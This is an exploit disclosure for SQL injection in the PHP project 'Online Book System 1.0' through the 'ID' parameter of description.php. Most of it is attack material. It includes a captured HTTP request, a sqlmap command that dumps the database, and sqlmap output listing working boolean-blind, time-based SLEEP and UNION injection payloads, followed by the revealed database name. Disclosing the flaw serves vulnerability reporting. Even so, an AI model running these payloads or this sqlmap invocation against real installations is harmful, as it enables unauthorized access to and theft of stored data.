# Online Book System- SQL Injection - 4
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'ID' parameter at "/BookStore-master%201/description.php?ID=ENT-1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master%201/description.php?ID=ENT-1"
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /BookStore-master%201/description.php?ID=ENT-1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'ID' parameter to dump the database.
```
sqlmap -r r.txt -p ID --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: ID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ID=ENT-1' AND 8011=8011-- upRB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ID=ENT-1' AND (SELECT 4981 FROM (SELECT(SLEEP(5)))RGPP)-- bZro

    Type: UNION query
    Title: Generic UNION query (NULL) - 14 columns
    Payload: ID=ENT-1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b7171,0x4174687452666d7070765279634b44754e4861526e5857506b716265727a7145524b4a41746c584e,0x7170717171),NULL,NULL,NULL-- -
---
[11:21:07] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:21:07] [INFO] fetching current database
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 182932](https://github.com/BurakSevben/CVEs/assets/117217689/07d64a4b-afa8-42a0-98da-ba0879855c21)
